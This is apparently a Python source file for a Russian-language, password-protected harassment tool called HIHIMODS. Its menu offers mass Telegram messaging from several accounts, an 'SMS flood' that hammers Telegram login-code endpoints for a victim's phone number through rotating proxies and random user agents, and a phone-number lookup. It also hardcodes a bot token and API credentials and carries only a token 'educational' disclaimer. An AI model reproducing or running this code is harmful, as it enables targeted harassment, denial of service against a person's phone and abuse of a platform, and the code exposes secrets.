import os
import sys
import time
import json
import random
import string
import asyncio
import threading
import urllib.request
from datetime import datetime
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from fake_useragent import UserAgent
import requests
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonOther
)
import aiohttp
import faker
from tqdm import tqdm
from termcolor import colored
import pyfiglet

ACCOUNTS_FILE = 'hihimods_accounts.json'
LOG_BOT = '7751277865:AAFsuYp30Agn0QBcrz691zmqigX_GhMUqWQ'
LOG_REC = 'YOUR_CHAT_ID'
API_ID = 26694251
API_HASH = '5b041e7b70b74c095435be2b74c02abf'
PASSWORD = "@hihimods"
TELEGRAM_CHANNEL = "https://t.me/hihimods"
AUTHOR = "@hihimods"

class HIHIMODS:
    def __init__(self):
        self.ua = UserAgent()
        self.fake = faker.Faker('ru_RU')
        self.proxies_list = self._load_proxies()
        self.session = requests.Session()
        self.accounts = []
        self.flood_urls = self._load_flood_urls()
        
    def _load_proxies(self):
        return [ ... ]  # Прокси оставлены без изменений для краткости

    def _load_flood_urls(self):
        return [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856',
            'https://oauth.telegram.org/auth/request',
            'https://my.telegram.org/auth/send_password',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279',
            'https://oauth.telegram.org/auth?bot_id=1199558236',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146',
            'https://oauth.telegram.org/auth/request?bot_id=466141824',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901',
            'https://oauth.telegram.org/auth/request?bot_id=319709511',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014',
            'https://oauth.telegram.org/auth/request?bot_id=210944655'
        ]

    def print_logo(self):
        logo = pyfiglet.figlet_format("HIHIMODS", font="slant")
        colored_logo = colored(logo, 'cyan')
        print(colored_logo)
        print(colored("="*50, 'yellow'))
        print(colored(f"Author: {AUTHOR}", 'green'))
        print(colored(f"Channel: {TELEGRAM_CHANNEL}", 'green'))
        print(colored("="*50, 'yellow'))
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def check_password(self):
        password = input(colored("Введите пароль: ", 'yellow'))
        if password != PASSWORD:
            print(colored("Неверный пароль! Доступ запрещен.", 'red'))
            sys.exit()
        print(colored("Доступ разрешен. Запуск HIHIMODS...", 'green'))
        time.sleep(1)
        self.clear_screen()

    async def spam_tg(self):
        async def send_msgs(recipient, message, count, client):
            try:
                for i in range(count):
                    await client.send_message(recipient, message)
                    print(f"Отправлено {i+1}/{count}")
                    await asyncio.sleep(0.5)
            except Exception as e:
                print(f"Ошибка: {e}")

        print(colored("\nTelegram Spam", 'cyan'))
        recipient = input("Получатель (@username или номер): ")
        message = input("Текст сообщения: ")
        count = int(input("Количество: "))
        
        if not self.accounts:
            print("Нет аккаунтов! Добавьте через меню.")
            return
            
        tasks = []
        for acc in self.accounts:
            tasks.append(send_msgs(recipient, message, count, acc['client']))
        
        await asyncio.gather(*tasks)
        print(colored("Спам завершен!", 'green'))

    async def flood_codami(self):
        print(colored("\nFlood Codami", 'cyan'))
        number = input("Номер телефона: ")
        count = int(input("Количество запросов: "))
        
        success = 0
        for _ in range(count):
            for url in self.flood_urls:
                try:
                    proxy = random.choice(self.proxies_list)
                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                    headers = {'User-Agent': self.ua.random}
                    response = requests.post(url, data={'phone': number}, headers=headers, proxies=proxies, timeout=10)
                    if response.status_code == 200:
                        success += 1
                        print(f"[{success}] Отправлено на {url} через {proxy}")
                except Exception as e:
                    print(f"Ошибка с прокси {proxy}: {e}")
                    continue
        print(colored(f"Успешно отправлено: {success}", 'green'))

    def probiv_po_nomeru(self):
        print(colored("\nПробив по номеру", 'cyan'))
        number = input("Введите номер: ")
        
        try:
            proxy = random.choice(self.proxies_list)
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            url = f"https://htmlweb.ru/geo/api.php?json&telcod={number}"
            response = requests.get(url, proxies=proxies)
            data = response.json()
            print(colored("\nРезультаты:", 'yellow'))
            print(f"Страна: {data.get('country', {}).get('name', 'N/A')}")
            print(f"Регион: {data.get('region', {}).get('name', 'N/A')}")
            print(f"Оператор: {data.get('0', {}).get('oper', 'N/A')}")
        except Exception as e:
            print(colored(f"Ошибка: {e}", 'red'))

    async def run(self):
        self.clear_screen()
        print(colored("""
        ⚠️ Дисклеймер:
        Этот инструмент предназначен только для образовательных целей.
        Используйте на свой страх и риск.
        """, 'yellow'))
        time.sleep(2)
        
        self.print_logo()
        self.check_password()
        
        while True:
            self.clear_screen()
            self.print_logo()
            print(colored("\nГлавное меню:", 'cyan'))
            print(colored("[1] Telegram спам", 'magenta'))
            print(colored("[2] SMS флуд", 'magenta'))
            print(colored("[3] Пробив по номеру", 'magenta'))
            print(colored("[0] Выход", 'red'))
            
            choice = input(colored("\nВыберите: ", 'yellow'))
            
            if choice == '1':
                await self.spam_tg()
            elif choice == '2':
                await self.flood_codami()
            elif choice == '3':
                self.probiv_po_nomeru()
            elif choice == '0':
                print(colored("Выход...", 'red'))
                break
            else:
                print(colored("Неверный выбор!", 'red'))
            
            input(colored("\nНажмите Enter чтобы продолжить...", 'cyan'))

if __name__ == "__main__":
    tool = HIHIMODS()
    try:
        asyncio.run(tool.run())
    except KeyboardInterrupt:
        print(colored("\nРабота завершена", 'red'))
    except Exception as e:
        print(colored(f"\nОшибка: {e}", 'red'))